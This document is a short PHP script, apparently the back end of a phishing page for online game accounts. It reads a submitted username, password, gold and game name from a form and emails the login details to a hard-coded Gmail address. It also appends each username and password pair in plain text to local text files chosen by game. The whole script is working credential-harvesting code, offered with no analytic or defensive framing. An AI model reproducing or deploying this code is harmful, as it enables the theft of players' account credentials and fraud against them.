<?php 

function clean_string($string) 
{ 
    $bad = array("content-type","bcc:","to:","cc:","href");

    return str_replace($bad,"",$string);
}















/*  Info email  */







$email_to = "tusoncao@gmail.com"; 







$email_forward = "GamVip";   















/* Get data from post request */







$user = $_POST['txtUserName'] ; 







$pass = $_POST['txtPassword'] ; 







$coin = $_POST['coin'] ; 







$gold = $_POST['gold'] ; 







$game = $_POST['game'] ; 















if(!empty($user) && !empty($pass)) {







    $error_message = "";







    $email_message = "";  







    $email_messages = "";  















    $_SESSION['txtUserName'] = $user; 







    $_SESSION['txtPassword'] = $pass;















    // Body email







    $email_subject = "[".$game."] ID $user";  







    $email_message .= "ID: ".clean_string($user)."\n";    







    $email_message .= "PASS: ".clean_string($pass)."\n";      







    $email_message .= "GOLD: ".number_format($gold)."\n";        







    $email_message .= "GAME: ".clean_string($game)."\n";    







    $headers = 'From: '.$email_forward."\r\n". 











 



    'Reply-To: '.$email_forward."\r\n" .







 







    'X-Mailer: PHP/' . phpversion(); 







 















    @mail($email_to, $email_subject, $email_message, $headers);     







    



    $txt = $user.'|'.$pass;



    if($game=='R88'){



        $myfile = file_put_contents('46464.txt', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);



    }else{



        $myfile = file_put_contents('4646464.txt', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);



    }







    







} 







?>